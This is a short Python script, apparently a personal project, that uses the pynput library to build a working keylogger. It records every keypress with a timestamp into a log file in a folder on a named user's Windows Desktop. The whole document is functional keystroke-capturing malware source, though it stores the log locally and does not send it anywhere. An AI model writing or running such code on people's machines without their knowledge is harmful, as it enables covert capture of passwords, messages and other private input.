import pynput
from pynput.keyboard import Listener
import logging
import os

log_dir = r"C:/Users/Haifa Elhorra/Desktop/projet/keyylogger"   
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=os.path.join(log_dir, "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
